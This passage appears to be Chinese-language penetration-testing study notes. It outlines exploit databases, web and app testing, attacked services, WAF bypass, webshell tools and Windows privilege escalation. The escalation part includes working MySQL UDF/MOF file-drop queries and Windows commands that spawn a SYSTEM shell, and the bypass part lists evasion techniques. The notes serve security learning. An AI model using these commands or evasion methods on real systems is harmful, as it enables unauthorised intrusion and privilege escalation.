2. 类型：远程执行，权限提升，缓冲区溢出
3. 利用
   1. 工具框架
      1. Metasploit
      2. Searchsploit
      3. 企业单位内部产品
   2. 单点EXP
      1. cnvd
      2. seebug
      3. 1337day
      4. exploit-db
      5. Packetstorm Security
   3. 复现文章：各种资讯来源
4. 修复

#### 5.2 WEB应用

```
先确定web使用cms版本（通过网上cms平台输入ip确定），然后针对性查找漏洞（漏洞、后台、端口、源码泄露）
1. 已知CMS：如常见的dedecms.discuz,wordpress等源码结构,这种一般采用非框架类开发,但也有少部分采用的是框架类开发,针对此类源码程序的安全检测,我们要利用公开的漏洞进行测试,如不存在可采用白盒代码审计自行挖掘。

2. 开发框架：如常见的thinkphp,spring,flask等开发的源码程序,这种源码程序正常的安全

   测试思路:先获取对应的开发框架信息(名字,版本),通过公开的框架类安全问题进行测试,如不存在可采用白盒代码审计自行挖掘。

3. 未知CMS：如常见的企业或个人内部程序源码,也可以是某cMs二次开发的源码结构,针对此类的源码程序测试思路:能识别二次开发就按已知cMs思路进行,不能确定二次开发的话可以采用常规综合类扫描工具或脚本进行探针,也可以采用人工探针(功能点,参数,盲猜),同样在有源码的情况下也可以进行代码审计自行挖掘。
```

1. 已知cms：利用公开漏洞测试，或白盒代码审计
   1. 漏洞平台：cnvdseebug 1337day exploit-db  Packetstorm Security
   2. 工具框架cmsscan  wpscan joomscan  drupalscan
   3. 代码审计函数点挖掘  功能点挖掘  框架类挖掘
2. 开发框架：先获取对应框架信息，通过公开框架类安全问题进行测试
   1. PHP ：YII  Laravel  thinkphp
   2. JAVA:shiro  struts spring  Marven
   3. Python:Flask  Django  Tornado
3. 未知cms：能识别二次开发就按已知CMS思路进行，不能确定就采用综合类扫描工具或脚本进行探针，也可以采用人工探针
   1. 工具框架：xray  awvs  appscan  企业内部工具
   2. 人工探针：应用功能  URL参数  盲猜
4. 代码审计：通过一些代码审计软件，确定漏洞

#### 5.3 APP应用 

1. 抓包
   1. http/https:burpsuite  charles  fiddler 
   2. 其他   wireshark
2. 协议
   1. Web协议类：按上诉
   2. 其他协议：按下述
3. 逆向
   1. 一键提取APK涉及URL
   2. 反编译重写代码段编译测试

#### 5.4 服务协议

1. 安全方向
   1. WEB服务类：Weblogic,Wevsphere,Glassfish,Jetty,Apache,IIS,Rrsin,Nginx
   2. 数据库类：Mysql,Oracle,Redis,Postgresql,sybase,Memcache,Elasticsearch,DB2
   3. 大数据类：Hadoop,Zookeeper
   4. 文件共享：FTP,NFS,Samba,LDAP
   5. 邮件服务：SMTP,POP3,IMAP
   6. 远程访问：SSH,RDP,Telent,VNC,pcanywhere
   7. 其他服务：DNS,DHCP,SNMP,Rlogin,Rsync,Zabbix,RMI,Docker
   8. 探针检测：Nmap,Nessus,Masscan
   9. 利用测试：单个EXP，单个脚本或工具
   10. 安全修复：打好补丁，版本升级，部署WAF
2. API接口
   1. 应用面：产品管理，用户管理，支付管理，短信管理，订单管理

   2. 探针面：爬虫参数，应用猜测，引擎查找
   3. 安全面：逻辑越权，输入控制，接口安全，信息泄露
   4. 利用面：Soap UI PRO，WS-Attacker，Burp Suite
   5. 修复面：打好补丁，版本升级，部署WAF
3. 其他补充
   1. 端口WEB：xx.com  xx.com:8080
   2. IP-WEB：xx.xx.xx.xx
   3. 域名WEB：注册人，域名登记，特有信息

### 6.WAF绕过

1. 信息收集
   1. 测试环境
   2. 绕过分析：抓包技术、WAF说明、FUZZ测试
   3. 绕过手法：数据包特征（请求方式、模拟用户、爬虫引擎、白名单机制），请求速度（延时、代理池、爬虫引擎、白名单机制   ）
2. 漏洞发现
   1. 工具
      1. 综合：AWVS,Xray,appacan
      2. 单点：tpscan,wpscan,st2scan
   2. 触发
      1. 扫描速度：延时，代理池，白名单
      2. 工具指纹：特征修改，模拟用户
      3. 漏洞Payload：数据变异，冷门扫描
3. 漏洞利用
   1. SQL注入
   2. 文件上传
   3. 文件包含
   4. RCE执行
   5. XSS跨站
4. 权限控制
   1. 脚本：ASP、PHP、JSP、ASPX 、PY,WARS
   2. 工具：菜刀(单向加密)、奕剑（单向加密，可拓展）、冰蝎（双向加密，可拓展）
   3. 代码：加密混淆（webshell-venom  php-venom  as_websell_venom）、异或生成、变量覆盖
   4. 行为：指纹变异、自写轮子![image-20210628202130027](C:\Users\Jang\AppData\Roaming\Typora\typora-user-images\image-20210628202130027.png)
   5. 检测：常规安全脚本使用

### 7.代码审计

1. 语言：php，java
2. 框架：
3. 漏洞：
   1. SQL注入
   2. 文件上传
   3. xss跨站
   4. RCE执行
   5. 文件包含
   6. 反序列化
   7. 其他漏洞
4. 案例
   1. demo段
   2. 完整源码
   3. 框架源码
5. 技巧
   1. 随机挖掘：搜索关键字，可控变量
   2. 定点挖掘：抓包分析源码特定代码段
   3. 框架源码：
6. 工具
   1. RIPS，Fortify，Seay系统

### 8.权限提升

```

```

1. webshell

   1. 后台
      1. 功能点：文件上传，模板修改，SQL执行，数据备份	
      2. 思路点：已知程序，未知程序
   2. 漏洞
      1. 单点漏洞
      2. 组合漏洞
   3. 第三方
      1. 编辑器
      2. 中间件平台
      3. phpmyadmin

2. 其他权限

   1. 数据库：mssql，mysql，oracle
   2. 服务类：FTP，RDP，SSH
   3. 第三方接口：邮件，支付，中间商，

3. 服务器系统 

   1. windows<img src="C:\Users\Jang\AppData\Roaming\Typora\typora-user-images\image-20210630102621991.png" alt="image-20210630102621991" style="zoom: 67%;" />

      1. 针对环境：web，本地

      2. 提权方法：服务探针->信息收集->提权利用->获取权限

         1. 数据库(需要获得最高权限密码)：

            1. 探针：端口，服务，其他

            2. 收集：最高权限密码

               1. 配置文件(了解命名规则):sql data inc config conn database common include
               2. 存储文件:@@datadir/data/数据库名/表名.myd
               3. 暴力破解:远程与本地
               4. 其他

            3. 分类：

               1. Mysql(UDF,MOF,启动项,反弹shell)3306

                  ```mysql
                  UDF：利用自定义执行函数导出dll文件进行命令执行
                  1.手工创建plugin目录或利用NTFS流创建
                  select 'x' into dumpfile' 目录/lib/plugin::INDEX ALLOCATION';
                  1.mysql<5.1导出目录c:/windowsdsystem32
                  2.mysql=>5.1导出安装目录@@basedir/1ib/plugin/ 
                  MOF：导出自定义mof文件到系统目录加载
                  select load_file('C:/phpstudy/PHPTutorial/wwW/user_add.mof')into dumpfile'c:/windows/system32/wbem/mof/nullevt.mof';
                  启动项：导出自定义可执行文件到启动目录配合重启执行将创建好的后门或执行文件进行服务器启动项写入,配合重启执行!
                  ```

                  

               2. Mssql(xp_cmdshell,sp_oacreate,sp_oamethod,沙盒模式,映像劫持)1433

               3. Oracle(普通用户,DBA用户,注入模式) 1521

               4. Redis 6379/Postgresql

         2. **溢出漏洞**(可以使用cmd)：信息收集->补丁筛选:Wes,windowsVulnScan->利用MSF或EXP->执行

            ```
            windows权限：
            普通权限：系统为用户分了7个组,并给每个组赋予不同的操作权限,管理员(Administrators)高权限用户组(Power Users),晋通用户组(Users)备份操作组(Backup Operators),文件复制组(Replicator)来宾用户组(Guests),身份验证用户组(Ahthenticated users)
            
            管理员(大部分操作权限)->高权限用户(不能修改系统设置，不能运行系统管理程序)->普通用户(不能处理涉及其他用户文件和管理的程序)->来宾(文件操作同上但无法执行程序)->身份验证
            
            特殊权限：SYSTEM(系统)，Trystedinstaller(信任程序模块)，Everyone(所有人)、CREATOR OWNER(创建者)等,这些特殊成员不被任何内置用户组吸纳,属于完全独立出来的账户。
            
            at 11:11 /interactive cmd.exe(2003版本前调用计划任务会使用system权限)
            sc Create syscmd binPath="cmd /K start" type= own type=interact
            sc start syscmd
            psexec.exe -accepteula -s -i -d cmd.exe(2008,需要安装pstools)
            ```

         3. 令牌窃取、

         4. 第三方软件、

         5. AT&SC&PS、

         6. 不安全的服务权限、

         7. 不带引号的服务路径、

         8. Unattended 

         9. Installs AlwaysInstallElevated

      3. 针对版本：xp，7/8/10，2k3/08，2012/16

### 9.内网安全



### 10.应急响应



### 11.Python开发

[CTF SSTI(服务器模板注入)]: https://www.cnblogs.com/20175211lyz/p/11425368.html



### 12.红蓝对抗



### 13. CTF夺旗



### 14. SRC挖掘



### 15. 工作面试






